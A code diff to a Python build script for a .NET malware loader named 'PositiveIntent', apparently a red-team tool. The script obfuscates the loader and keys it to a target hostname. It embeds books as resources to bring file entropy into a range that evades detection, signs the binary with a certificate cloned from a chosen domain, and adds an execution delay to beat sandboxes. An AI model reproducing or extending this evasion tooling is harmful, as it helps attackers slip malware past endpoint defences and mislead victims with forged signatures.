@@ -57,17 +57,17 @@ def embed_book(resx_file_path, resource_name, text_file_path):
 
 def build():
 
-    assembly_name = randomize_assembly_name(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\PositiveIntent.csproj"), ''.join(random.choices(string.ascii_letters, k=8)))
-    assembly_output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp\\PositiveIntent\\bin\\release\\net48\\{assembly_name}.exe")
-    solution_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent.sln"))
-    resources_directory_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\Resources"))
-    resources_file_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\Properties\\Resources.resx"))
+    assembly_name = randomize_assembly_name(os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp/PositiveIntent/PositiveIntent.csproj")), ''.join(random.choices(string.ascii_letters, k=8)))
+    assembly_output_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp/PositiveIntent/bin/Release/net48/{assembly_name}.exe"))
+    solution_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp/PositiveIntent.sln"))
+    resources_directory_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp/PositiveIntent/Resources"))
+    resources_file_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp/PositiveIntent/Properties/Resources.resx"))
     embed_count = 0
 
     if sys.platform == 'win32':
         subprocess.run(["dotnet", "build", "--configuration", "Release", solution_path], check=True, stdout = subprocess.DEVNULL)
     else:
-        subprocess.run(["msbuild", "/p:Configuration=Release", solution_path], check=True, stdout = subprocess.DEVNULL)
+        subprocess.run(["msbuild", solution_path, "-r:true", "-p:Configuration=Release"], check=True, stdout = subprocess.DEVNULL)
 
     if(entropy.run(assembly_output_path) >= 5.50):
         for root, dirs, files in os.walk(resources_directory_path, topdown=True):
@@ -79,7 +79,7 @@ def build():
                     if sys.platform == 'win32':
                         subprocess.run(["dotnet", "build", "--configuration", "Release", solution_path], check=True, stdout = subprocess.DEVNULL)
                     else:
-                        subprocess.run(["msbuild", "/p:Configuration=Release", solution_path], check=True, stdout = subprocess.DEVNULL)
+                        subprocess.run(["msbuild", solution_path, "-r:true", "-p:Configuration=Release"], check=True, stdout = subprocess.DEVNULL)
                     if(4.50 <= entropy.run(assembly_output_path) <= 5.50):
                         break
             else:
@@ -88,7 +88,7 @@ def build():
 
     if(embed_count > 0):
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Embedded {embed_count} books as resource files')
-    if(4.50 >= entropy.run(assembly_output_path) >= 5.50):
+    if(entropy.run(assembly_output_path) >= 5.50 or entropy.run(assembly_output_path) <= 4.50):
         print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to normalize entropy. Need more books! Entropy of loader: {entropy.run(assembly_output_path)}. You can still run the loader at your own risk.')
     print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Entropy of loader: {entropy.run(assembly_output_path)}')
 
@@ -104,12 +104,14 @@ if __name__=="__main__":
                         help='Restrict execution of loader to hostname')
     parser.add_argument('--domain', type=str, required=True,
                         help='Domain to copy certificate from. Used to generate a self-signed certificate and digitally sign the loader.')
+    parser.add_argument('--delay', type=int, required=True,
+                        help='Number of seconds to delay loader execution. 60 seconds at a minimum is recommended.')
     args = parser.parse_args()
 
     # obfuscate loader source
     # key on hostname
     try:
-        obfuscate.run(args.hostname)
+        obfuscate.run(args.hostname, args.delay)
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Obfuscated loader source files')
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Keyed on hostname {args.hostname}')
     except Exception as exception: # is this error handling?
@@ -138,7 +140,7 @@ if __name__=="__main__":
     try:
         sign.run(args.domain, assembly_name)
         print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Digitally signed loader with certificate cloned from {args.domain}')
-        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + 'Loader compiled to ' + os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"..\\temp\\{assembly_name}.exe")))
+        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + 'Loader compiled to ' + os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp/{assembly_name}.exe")))
     except Exception as exception:
         print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to digitally sign loader')
         print(traceback.print_exc())
